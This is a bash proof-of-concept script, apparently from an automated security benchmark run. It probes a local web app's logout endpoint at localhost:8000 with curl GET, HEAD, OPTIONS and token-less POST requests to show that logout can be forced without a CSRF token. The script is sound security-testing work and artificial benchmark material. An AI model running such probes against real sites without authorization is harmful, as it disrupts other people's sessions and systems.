#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint by showing GET/HEAD/OPTIONS requests bypass CSRF protection with HTTP response codes
# Target: ./repo
# Created: 2025-11-04T17:17:32.350Z
# Session: benchmark-XBEN-025-24-mhktlvhv

# CSRF Vulnerability POC - Logout Endpoint GET Request Bypass
# This script demonstrates that the logout endpoint is vulnerable to CSRF attacks
# via GET, HEAD, and OPTIONS HTTP methods that bypass CSRF protection

TARGET_URL="http://localhost:8000"
LOGOUT_ENDPOINT="/accounts/logout/"

echo "========================================"
echo "CSRF Vulnerability PoC - Logout Endpoint"
echo "========================================"
echo ""

# Function to get CSRF token from a page
get_csrf_token() {
    curl -s -b cookies.txt "${TARGET_URL}/accounts/login/" | grep -oP "csrfmiddlewaretoken['\"]?\s*[=:]\s*['\"]?\K[^'\">\s]+" | head -1
}

echo "[*] Testing CSRF protection bypass on logout endpoint"
echo ""

# Test 1: GET request to logout
echo "[TEST 1] GET request to logout endpoint"
echo "Command: curl -w 'HTTP Status: %{http_code}\n' -i -b cookies.txt '${TARGET_URL}${LOGOUT_ENDPOINT}'"
echo ""
GET_OUTPUT=$(curl -w '\nHTTP_CODE:%{http_code}' -i -b cookies.txt "${TARGET_URL}${LOGOUT_ENDPOINT}" 2>&1)
echo "$GET_OUTPUT"
echo ""

# Extract HTTP code
GET_CODE=$(echo "$GET_OUTPUT" | grep "HTTP_CODE:" | cut -d: -f2)
if [ "$GET_CODE" = "302" ] || [ "$GET_CODE" = "301" ] || [ "$GET_CODE" = "200" ]; then
    echo "[!] VULNERABLE: GET request succeeded (HTTP $GET_CODE) - No CSRF token required!"
    VULN_FOUND=1
else
    echo "[+] GET request rejected (HTTP $GET_CODE)"
fi
echo ""
echo "---"
echo ""

# Test 2: HEAD request to logout
echo "[TEST 2] HEAD request to logout endpoint"
echo "Command: curl -w 'HTTP Status: %{http_code}\n' -i -X HEAD -b cookies.txt '${TARGET_URL}${LOGOUT_ENDPOINT}'"
echo ""
HEAD_OUTPUT=$(curl -w '\nHTTP_CODE:%{http_code}' -i -X HEAD -b cookies.txt "${TARGET_URL}${LOGOUT_ENDPOINT}" 2>&1)
echo "$HEAD_OUTPUT"
echo ""

HEAD_CODE=$(echo "$HEAD_OUTPUT" | grep "HTTP_CODE:" | cut -d: -f2)
if [ "$HEAD_CODE" = "302" ] || [ "$HEAD_CODE" = "301" ] || [ "$HEAD_CODE" = "200" ]; then
    echo "[!] VULNERABLE: HEAD request succeeded (HTTP $HEAD_CODE) - No CSRF token required!"
    VULN_FOUND=1
else
    echo "[+] HEAD request rejected (HTTP $HEAD_CODE)"
fi
echo ""
echo "---"
echo ""

# Test 3: OPTIONS request to logout
echo "[TEST 3] OPTIONS request to logout endpoint"
echo "Command: curl -w 'HTTP Status: %{http_code}\n' -i -X OPTIONS -b cookies.txt '${TARGET_URL}${LOGOUT_ENDPOINT}'"
echo ""
OPTIONS_OUTPUT=$(curl -w '\nHTTP_CODE:%{http_code}' -i -X OPTIONS -b cookies.txt "${TARGET_URL}${LOGOUT_ENDPOINT}" 2>&1)
echo "$OPTIONS_OUTPUT"
echo ""

OPTIONS_CODE=$(echo "$OPTIONS_OUTPUT" | grep "HTTP_CODE:" | cut -d: -f2)
if [ "$OPTIONS_CODE" = "302" ] || [ "$OPTIONS_CODE" = "301" ] || [ "$OPTIONS_CODE" = "200" ]; then
    echo "[!] VULNERABLE: OPTIONS request succeeded (HTTP $OPTIONS_CODE)"
    VULN_FOUND=1
else
    echo "[+] OPTIONS request rejected (HTTP $OPTIONS_CODE)"
fi
echo ""
echo "---"
echo ""

# Test 4: POST request WITHOUT CSRF token (should fail)
echo "[TEST 4] POST request WITHOUT CSRF token (control test)"
echo "Command: curl -w 'HTTP Status: %{http_code}\n' -i -X POST -b cookies.txt '${TARGET_URL}${LOGOUT_ENDPOINT}'"
echo ""
POST_NOCSRF_OUTPUT=$(curl -w '\nHTTP_CODE:%{http_code}' -i -X POST -b cookies.txt "${TARGET_URL}${LOGOUT_ENDPOINT}" 2>&1)
echo "$POST_NOCSRF_OUTPUT"
echo ""

POST_NOCSRF_CODE=$(echo "$POST_NOCSRF_OUTPUT" | grep "HTTP_CODE:" | cut -d: -f2)
if [ "$POST_NOCSRF_CODE" = "403" ]; then
    echo "[+] POST without CSRF token properly rejected (HTTP 403)"
    echo "[!] This confirms POST requires CSRF token, but GET does not!"
elif [ "$POST_NOCSRF_CODE" = "302" ] || [ "$POST_NOCSRF_CODE" = "301" ] || [ "$POST_NOCSRF_CODE" = "200" ]; then
    echo "[!] WARNING: POST without CSRF token was accepted (HTTP $POST_NOCSRF_CODE) - Severe vulnerability!"
    VULN_FOUND=1
else
    echo "[?] POST request returned: HTTP $POST_NOCSRF_CODE"
fi
echo ""

echo "========================================"
echo "SUMMARY"
echo "========================================"
if [ "$VULN_FOUND" = "1" ]; then
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "    - GET/HEAD/OPTIONS bypass CSRF protection"
    echo "    - POST method properly enforces CSRF token"
    echo "    - Attacker can force logout via GET request"
    exit 0
else
    echo "[+] Testing complete - Check results above"
    exit 0
fi